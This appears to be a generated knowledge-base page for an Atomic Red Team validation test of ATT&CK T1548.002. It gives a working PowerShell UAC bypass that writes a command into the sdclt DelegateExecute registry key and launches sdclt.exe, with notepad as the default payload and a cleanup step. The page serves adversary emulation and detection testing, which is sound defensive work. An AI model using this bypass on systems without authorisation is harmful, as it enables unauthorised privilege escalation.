---
atomic_guid: "3be891eb-4608-4173-87e8-78b494c029b7"
title: "Bypass UAC using sdclt DelegateExecute"
framework: "atomic"
generated: "true"
attack_technique_id: "T1548.002"
attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "3be891eb-4608-4173-87e8-78b494c029b7"
  - "Bypass UAC using sdclt DelegateExecute"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Bypass UAC using sdclt DelegateExecute

Bypasses User Account Control using a fileless method, registry only.
Upon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe
[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)
Adapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)

## Metadata

- Atomic GUID: 3be891eb-4608-4173-87e8-78b494c029b7
- Technique: T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1548.002/T1548.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1548-abuse_elevation_control_mechanism|T1548.002]]

## Input Arguments

### command_to_execute

- description: Command to execute
- type: string
- default: cmd.exe /c notepad.exe

## Executor

- name: powershell

### Command

```powershell
New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value '#{command_to_execute}'
New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3
```

### Cleanup

```powershell
Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml)
